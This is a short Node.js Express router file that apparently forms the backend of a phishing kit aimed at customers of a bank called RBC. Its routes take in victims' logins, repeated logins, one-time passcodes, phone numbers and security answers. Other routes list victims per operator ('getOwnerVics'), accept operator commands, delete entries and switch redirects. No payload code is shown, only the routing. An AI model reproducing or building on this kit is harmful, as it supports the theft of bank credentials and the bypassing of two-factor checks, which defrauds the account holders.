const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitOtp,
	submitTelephone,
	submitQuestion,
	deleteEntry,
	setRedirect,
} = require("../controllers/rbcController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/telephone", submitTelephone);
router.post("/question", submitQuestion);
router.post("/delete", deleteEntry);
router.get("/redirect/:active", setRedirect);

module.exports = router;
